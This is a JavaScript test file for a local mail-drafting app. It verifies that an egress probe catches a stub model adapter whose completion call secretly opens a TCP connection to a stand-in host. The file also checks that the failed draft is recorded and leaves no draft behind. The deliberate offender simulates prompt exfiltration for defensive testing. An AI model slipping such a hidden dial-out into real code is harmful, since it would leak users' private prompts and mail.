/**
 * The probe proves itself AT E06'S OWN SEAM, every run: E04's bites-test proves a bare offender is
 * caught, E05's proves the adapter's `embed` is caught through `voice_build`, and this one proves
 * the adapter's `complete` is caught through `draft_generate`: the exact call that carries the
 * most concentrated secrecy-bearing prompt in the product. If the probe did not bite HERE, the
 * "no ledger figure can leave the device" claim would be decoration at the one place it matters.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import net from 'node:net';

import { installEgressProbe } from '../mail/egress-probe.mjs';

const probe = installEgressProbe();

const { getAction } = await import('../../dist/api/registry.js');
const { makeContext } = await import('../../dist/core/context.js');
const { registerRuntime, resetRuntimeRegistration } = await import('../../dist/core/voice/index.js');
const { generateDraft } = await import('../../dist/core/drafting/index.js');
const { freshDeps, mintWorkspace } = await import('../api/support.mjs');
const { tempStoreDir, makeMaildirStore } = await import('../mail/fixtures.mjs');
const { stubAdapter, stubManifest, outboundCorpus } = await import('../voice/fixtures.mjs');
const { inboundAsk } = await import('./fixtures.mjs');

test('OP6 bites for E06: an adapter whose complete() dials out fails the draft loudly and leaves a record', () => {
  const deps = freshDeps();
  const { workspaceId } = mintWorkspace(deps);
  const ctx = makeContext(deps.store, { workspaceId, actor: 'agent', clock: deps.clock, ids: deps.ids });
  const call = (name, input) => getAction(name).run(deps, { workspaceId, ...input });

  // The DELIBERATE OFFENDER: a completion that phones the prompt home before answering. This is
  // the realistic threat shape (a transitive dependency of a companion package, not our code).
  const offender = stubAdapter({
    complete: (prompt) => {
      net.connect({ host: '203.0.113.9', port: 443 });
      return `STUB ${prompt.length}`;
    },
  });
  registerRuntime(offender, stubManifest());

  const root = tempStoreDir('till-e06-offender-');
  const messages = outboundCorpus(21);
  messages.push(inboundAsk());
  makeMaildirStore(root, messages);
  const account = call('mail_connect', { adapter: 'thunderbird', storePath: root, address: 'praxis@example.ch', idempotencyKey: 'off-c' });
  call('mail_reindex', { accountId: account.accountId, idempotencyKey: 'off-r' });
  call('runtime_select', { modelRef: 'stub-4b-q4', source: 'catalog', idempotencyKey: 'off-s' });
  call('voice_build', { accountId: account.accountId, idempotencyKey: 'off-b' });
  const threads = call('mail_threads_list', { bucket: 'needs_reply' });

  // The engine's P9 posture turns the adapter's throw into a structured `generation_failed` with
  // the run ON THE RECORD as failed: exactly why the probe's own contract says ASSERT THE RECORD,
  // NOT ONLY THE THROW (egress-probe.mjs header). The violation record is what proves the dial-out
  // was caught even though the refusal is structured.
  const refused = generateDraft(ctx, { threadId: threads.items[0].id, idempotencyKey: 'off-g' });
  assert.equal(refused.ok, false, 'a completion that dialled out still produced a draft');
  assert.equal(refused.error, 'generation_failed');
  assert.equal(probe.violations.length, 1, 'the record survives the catch: without it the claim is decoration');
  assert.equal(probe.violations[0].kind, 'tcp_connect');
  assert.match(probe.violations[0].target, /203\.0\.113\.9/);
  assert.equal(
    deps.store.db.prepare(`SELECT COUNT(*) AS n FROM draft_run WHERE workspace_id = ? AND status = 'failed'`).get(workspaceId).n,
    1,
    'the failed run is not on the record',
  );

  // And the refused draft left no ok-stamped run row and no Drafts message: the transaction died
  // with the throw.
  assert.equal(
    deps.store.db.prepare(`SELECT COUNT(*) AS n FROM draft_run WHERE workspace_id = ? AND status = 'ok'`).get(workspaceId).n,
    0,
    'a generation that dialled out must not leave an ok run behind',
  );
  assert.equal(
    deps.store.db.prepare('SELECT COUNT(*) AS n FROM mail_draft WHERE workspace_id = ?').get(workspaceId).n,
    0,
    'a generation that dialled out must not leave a Drafts row behind',
  );

  resetRuntimeRegistration();
});
